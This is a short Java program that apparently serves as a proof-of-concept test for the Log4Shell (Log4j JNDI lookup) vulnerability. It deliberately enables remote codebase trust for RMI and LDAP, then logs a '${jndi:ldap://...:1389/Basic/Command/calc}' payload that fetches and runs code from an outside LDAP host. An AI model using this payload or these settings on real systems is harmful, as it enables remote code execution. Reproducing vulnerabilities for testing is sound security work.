import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;
 
 
public class log4jTest {
    private static final Logger logger = LogManager.getLogger(log4jTest.class);
    public static void main(String[] args) {
    	try {
    		// -Dlog4j2.formatMsgNoLookups=true jvm参数修复
			// 避免因为Java版本过高而无法触发此漏洞
			System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
			System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
			System.out.println("start: " + System.currentTimeMillis() );
			// 此处ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1
			logger.error("${jndi:ldap://192.168.1.20:1389/Basic/Command/calc}");
			System.out.println("end:   " + System.currentTimeMillis() );
		} catch (Exception e){
    		e.printStackTrace();
		}

    }
}
